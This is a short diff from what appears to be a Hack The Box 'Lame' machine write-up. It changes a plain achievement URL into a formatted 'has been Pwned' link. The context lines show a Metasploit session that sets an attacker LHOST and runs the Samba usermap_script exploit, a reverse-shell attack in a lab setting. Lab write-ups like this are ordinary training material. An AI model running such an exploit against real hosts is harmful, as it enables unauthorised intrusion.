@@ -188,5 +188,5 @@ LHOST => 10.10.16.92
 msf6 exploit(multi/samba/usermap_script) > exploit
 ```
 
-> <https://www.hackthebox.com/achievement/machine/1521382/1>
+> <a href="https://www.hackthebox.com/achievement/machine/1521382/1" target="_blank">Lame Machine from Hack The Box has been Pwned</a>
 {: .prompt-tip }
